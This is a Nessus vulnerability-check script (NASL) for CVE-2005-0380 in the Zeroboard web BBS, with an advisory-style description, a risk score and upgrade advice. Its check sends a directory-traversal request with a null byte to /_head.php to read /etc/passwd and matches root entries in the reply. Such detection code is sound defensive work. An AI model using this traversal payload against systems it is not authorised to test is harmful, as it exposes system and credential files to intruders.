#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref:  Jeremy Bae  - STG Security
#
# This script is released under the GNU GPL v2

if(description)
{
  script_id(16178);
  script_cve_id("CVE-2005-0380");
  script_bugtraq_id(12258);
  if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"12925");
  script_version("$Revision: 1.5 $");
  
  script_name(english:"Zeroboard flaws (2)");

 desc["english"] = "
Synopsis :

The remote web server contains several PHP scripts that are prone to
arbitrary PHP code execution and file disclosure attacks.

Description :

The remote host runs Zeroboard, a web BBS application popular in Korea. 

The remote version of this CGI is vulnerable to multiple flaws which may
allow an attacker to execute arbitrary PHP commands on the remote host
by including a PHP file hosted on a third-party server, or to read
arbitrary files with the privileges of the remote web server. 

See also :

http://marc.theaimsgroup.com/?l=bugtraq&m=110565373407474&w=2

Solution: 

Upgrade to Zeroboard 4.1pl6 or later.

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";

  script_description(english:desc["english"]);
  script_summary(english:"Checks for Zeroboard flaws");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
  script_family(english:"CGI abuses");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencie("http_version.nasl");
  exit(0);
}

#the code

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if ( ! get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);

if (thorough_tests) dirs = make_list("/bbs", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 req = http_get(item:string(dir, "/_head.php?_zb_path=../../../../../../../../../../etc/passwd%00"), port:port);
 res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if(res == NULL) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:", string:res)){
        security_warning(port);
        exit(0);
        }
}
